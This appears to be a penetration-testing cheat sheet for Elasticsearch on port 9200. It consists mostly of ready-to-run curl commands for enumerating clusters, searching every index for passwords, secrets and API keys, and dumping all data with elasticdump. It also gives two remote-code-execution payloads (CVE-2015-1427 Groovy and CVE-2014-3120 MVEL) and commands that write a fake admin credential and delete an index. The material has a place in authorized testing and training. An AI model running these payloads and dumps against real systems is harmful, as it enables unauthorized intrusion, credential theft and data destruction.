# Port 9200 - Elasticsearch

## Table of Contents
- [Enumeration](#enumeration)
- [Data Extraction](#data-extraction)
- [Exploitation](#exploitation)

---

## Enumeration

### Quick Check (One-liner)

```shell
curl -s "http://$rhost:9200" && curl -s "http://$rhost:9200/_cat/indices?v"
```

### Nmap

```shell
nmap -sV -sC -p 9200 $rhost
nmap -p 9200 --script "http-methods" $rhost
```

### Basic Information

```shell
# Cluster info
curl -s "http://$rhost:9200" | jq

# Cluster health
curl -s "http://$rhost:9200/_cluster/health" | jq

# Cluster stats
curl -s "http://$rhost:9200/_cluster/stats" | jq

# Nodes info
curl -s "http://$rhost:9200/_nodes" | jq
```

### List Indices

```shell
# List all indices
curl -s "http://$rhost:9200/_cat/indices?v"

# Detailed index info
curl -s "http://$rhost:9200/_cat/indices?v&pretty"
```

---

## Data Extraction

### Search All Data

```shell
# Search all indices
curl -s "http://$rhost:9200/_search?pretty"

# Search specific index
curl -s "http://$rhost:9200/index_name/_search?pretty"

# Limit results
curl -s "http://$rhost:9200/_search?size=100&pretty"
```

### Search for Sensitive Data

```shell
# Search for passwords
curl -s "http://$rhost:9200/_all/_search?q=password&pretty"
curl -s "http://$rhost:9200/_all/_search?q=passwd&pretty"

# Search for credentials
curl -s "http://$rhost:9200/_all/_search?q=credentials&pretty"
curl -s "http://$rhost:9200/_all/_search?q=secret&pretty"
curl -s "http://$rhost:9200/_all/_search?q=api_key&pretty"

# Search for specific user
curl -s "http://$rhost:9200/_all/_search?q=admin&pretty"
```

### Get Index Mapping

```shell
# Get field mappings
curl -s "http://$rhost:9200/index_name/_mapping?pretty"

# All mappings
curl -s "http://$rhost:9200/_mapping?pretty"
```

### Dump All Documents

```shell
# Dump index
curl -s "http://$rhost:9200/index_name/_search?pretty&size=10000"

# Using elasticdump
elasticdump --input=http://$rhost:9200/index_name --output=dump.json --type=data
```

---

## Exploitation

### CVE-2015-1427 - Groovy RCE

> Affected: Elasticsearch < 1.3.8, 1.4.x < 1.4.3

```shell
# Check version first
curl -s "http://$rhost:9200" | jq '.version.number'

# RCE payload
curl -X POST "http://$rhost:9200/_search?pretty" -H 'Content-Type: application/json' -d '
{
  "script_fields": {
    "exploit": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"
    }
  }
}'
```

### CVE-2014-3120 - MVEL RCE

> Affected: Elasticsearch < 1.2

```shell
# Create index
curl -X POST "http://$rhost:9200/test/test/1" -d '{"name":"test"}'

# RCE
curl -X POST "http://$rhost:9200/_search?pretty" -d '
{
  "query": {
    "filtered": {
      "query": {"match_all": {}}
    }
  },
  "script_fields": {
    "exp": {
      "script": "import java.util.*;import java.io.*;String str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"id\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"
    }
  }
}'
```

### Write to Index (if writable)

```shell
# Create document
curl -X POST "http://$rhost:9200/myindex/_doc" -H 'Content-Type: application/json' -d '
{
  "username": "admin",
  "password": "hacked"
}'

# Delete index
curl -X DELETE "http://$rhost:9200/index_name"
```

---

## Authenticated Access

```shell
# With basic auth
curl -u elastic:password -s "http://$rhost:9200/_cat/indices?v"

# With API key
curl -H "Authorization: ApiKey $api_key" -s "http://$rhost:9200/_cat/indices?v"
```

---

## Quick Reference

| Endpoint | Description |
| :--- | :--- |
| `/_cat/indices` | List all indices |
| `/_search` | Search all data |
| `/_cluster/health` | Cluster status |
| `/_nodes` | Node information |
| `/index/_mapping` | Get field mappings |
| `/index/_search` | Search specific index |

| Command | Description |
| :--- | :--- |
| `curl http://$rhost:9200` | Get cluster info |
| `curl http://$rhost:9200/_cat/indices?v` | List indices |
| `curl http://$rhost:9200/_all/_search?q=password` | Search for passwords |
